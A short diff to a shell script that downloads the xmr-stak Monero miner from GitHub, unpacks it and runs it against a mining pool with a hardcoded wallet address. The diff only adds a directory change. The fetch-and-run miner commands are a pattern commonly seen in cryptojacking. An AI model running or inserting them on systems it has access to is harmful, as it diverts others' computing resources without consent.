@@ -1,4 +1,5 @@
 curl https://github.com/fireice-uk/xmr-stak/releases/download/1.0.5-rx/xmr-stak-rx-linux-1.0.5-cpu.tar.xz -L --output xmr-stak-rx-linux-1.0.5-cpu.tar.xz
 tar -Jxf xmr-stak-rx-linux-1.0.5-cpu.tar.xz
+cd xmr-stak-rx-linux-1.0.5-cpu
 chmod +x xmr-stak-rx
 ./xmr-stak-rx --currency monero -o sg.minexmr.com:4444 -u 41tkrfem8atNNAcPqSV9HYiNxogqwwqtfFJhhGPGumcfY4RqgCZYph2AuQbomKPi3LNhsJLurt7wtHv4ZxMskfoBB3ekGLT
